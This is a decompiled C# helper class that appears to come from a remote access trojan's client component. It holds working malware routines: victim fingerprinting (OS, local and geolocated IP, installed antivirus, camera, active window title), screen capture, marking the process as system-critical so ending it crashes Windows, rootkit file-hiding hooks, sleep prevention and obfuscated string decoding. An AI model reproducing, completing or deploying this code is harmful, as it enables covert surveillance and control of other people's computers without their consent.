using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace Client.Helper;

public class Methods
{
	public static Random random = new Random();

	public static string GetWindowsVersion()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(EncryptString.Decode("SELECT * FROM Win32_OperatingSystem")).Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.Current;
					return (string)((ManagementBaseObject)val)[EncryptString.Decode("Caption")] + EncryptString.Decode(" ") + (string)((ManagementBaseObject)val)[EncryptString.Decode("OSArchitecture")];
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return EncryptString.Decode("Error Get Version");
	}

	public static string GetLocalIP()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return iPAddress.ToString();
				}
			}
		}
		catch
		{
		}
		return "127.0.0.1";
	}

	public static string GetGeoInfo()
	{
		try
		{
			using WebClient webClient = new WebClient();
			string[] array = webClient.DownloadString("http://ip-api.com/line/?fields=query,country,countryCode").Split(new char[1] { '\n' });
			if (array.Length >= 3)
			{
				return array[0] + " - " + array[1] + " (" + array[2] + ")";
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string GetProcessName()
	{
		try
		{
			return Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
		}
		catch
		{
			try
			{
				return Process.GetCurrentProcess().ProcessName + ".exe";
			}
			catch
			{
			}
		}
		return "Unknown";
	}

	public static string GetCommandLine()
	{
		try
		{
			return Environment.CommandLine;
		}
		catch
		{
		}
		return "Unknown";
	}

	public static void Exit()
	{
		try
		{
			UnsetProcessCritical();
		}
		catch
		{
		}
		try
		{
			Rootkit.ShowFiles();
		}
		catch
		{
		}
		MutexControl.Exit();
		Environment.Exit(0);
	}

	public static void MaxPriority()
	{
		try
		{
			Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
		}
		catch
		{
		}
	}

	public static void PreventSleep()
	{
		try
		{
			DllImport.SetThreadExecutionState((DllImport.EXECUTION_STATE)2147483651u);
		}
		catch
		{
		}
	}

	public static void SetProcessCritical()
	{
		try
		{
			if (Config.ProcessCritical == "true")
			{
				DllImport.RtlSetProcessIsCritical(1u, 0u, 0u);
			}
		}
		catch
		{
		}
	}

	public static void UnsetProcessCritical()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				DllImport.RtlSetProcessIsCritical(0u, 0u, 0u);
			}
		}
		catch
		{
		}
	}

	public static string GetExecutablePath()
	{
		try
		{
			return Path.GetFullPath(Process.GetCurrentProcess().MainModule.FileName);
		}
		catch
		{
			return Process.GetCurrentProcess().MainModule.FileName;
		}
	}

	public static byte[] GetResourceFile(string name)
	{
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		if (stream == null)
		{
			return null;
		}
		using MemoryStream memoryStream = new MemoryStream();
		stream.CopyTo(memoryStream);
		return memoryStream.ToArray();
	}

	public static List<string> GetHardwareInfo(string WIN32_Class, string ClassItemField)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		List<string> list = new List<string>();
		ManagementObjectSearcher val = new ManagementObjectSearcher(EncryptString.Decode("SELECT * FROM ") + WIN32_Class);
		try
		{
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.Current;
					list.Add(((ManagementBaseObject)val2)[ClassItemField].ToString().Trim());
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
		return list;
	}

	public static string Antivirus()
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(EncryptString.Decode("\\\\") + Environment.MachineName + EncryptString.Decode("\\root\\SecurityCenter2"), EncryptString.Decode("Select * from AntivirusProduct"));
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.Current;
						text = text + ((ManagementBaseObject)val2)[EncryptString.Decode("displayName")].ToString() + EncryptString.Decode("; ");
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			if (text.Length > 2)
			{
				text = text.Remove(text.Length - 2);
			}
			return (!string.IsNullOrEmpty(text)) ? text : EncryptString.Decode("N/A");
		}
		catch
		{
			return EncryptString.Decode("Unknown");
		}
	}

	public static string GetActiveWindowTitle()
	{
		try
		{
			int num = 520;
			StringBuilder stringBuilder = new StringBuilder(num);
			if (DllImport.GetWindowText(DllImport.GetForegroundWindow(), stringBuilder, num) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return EncryptString.Decode("[Idle]");
	}

	public static string Camera()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectCollection val = new ManagementObjectSearcher(new ObjectQuery(EncryptString.Decode("SELECT * FROM Win32_PnPEntity WHERE PNPClass = 'Camera'"))).Get();
			if (val.Count > 0)
			{
				ManagementObjectEnumerator enumerator = val.GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						return (string)((ManagementBaseObject)(ManagementObject)enumerator.Current)[EncryptString.Decode("Caption")];
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			return EncryptString.Decode("None");
		}
		catch
		{
		}
		return EncryptString.Decode("None");
	}

	public static byte[] CaptureResizeReduceQuality()
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		int num = 100;
		int num2 = 100;
		long num3 = 100L;
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		Bitmap val3 = new Bitmap(num, num2);
		Graphics val4 = Graphics.FromImage((Image)(object)val3);
		try
		{
			val4.InterpolationMode = (InterpolationMode)7;
			val4.DrawImage((Image)(object)val, 0, 0, num, num2);
		}
		finally
		{
			((IDisposable)val4)?.Dispose();
		}
		EncoderParameter val5 = new EncoderParameter(Encoder.Quality, num3);
		ImageCodecInfo encoderInfo = GetEncoderInfo(EncryptString.Decode("image/jpeg"));
		EncoderParameters val6 = new EncoderParameters(1);
		val6.Param[0] = val5;
		using MemoryStream memoryStream = new MemoryStream();
		((Image)val3).Save((Stream)memoryStream, encoderInfo, val6);
		return memoryStream.ToArray();
	}

	private static ImageCodecInfo GetEncoderInfo(string mimeType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		foreach (ImageCodecInfo val in imageEncoders)
		{
			if (val.MimeType == mimeType)
			{
				return val;
			}
		}
		return null;
	}

	public static string GetPath(string pth)
	{
		if (string.IsNullOrEmpty(pth))
		{
			return pth;
		}
		pth = pth.Replace("%Windows%", Environment.GetFolderPath(Environment.SpecialFolder.Windows));
		pth = pth.Replace("%ProgramFiles%", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
		pth = pth.Replace("%ApplicationData%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		pth = pth.Replace("%UserProfile%", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
		pth = pth.Replace("%MyDocuments%", Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		pth = pth.Replace("%Cookies%", Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
		pth = pth.Replace("%CommonPictures%", Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		pth = pth.Replace("%LocalApplicationData%", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
		pth = pth.Replace("%CommonDocuments%", Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		pth = pth.Replace("%Templates%", Environment.GetFolderPath(Environment.SpecialFolder.Templates));
		pth = pth.Replace("%MyMusic%", Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
		pth = pth.Replace("%MyVideos%", Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
		try
		{
			pth = Environment.ExpandEnvironmentVariables(pth);
		}
		catch
		{
		}
		return pth;
	}

	public static string GetShortPath(string longPath)
	{
		StringBuilder stringBuilder = new StringBuilder(255);
		DllImport.GetShortPathName(longPath, stringBuilder, stringBuilder.Capacity);
		return stringBuilder.ToString();
	}
}
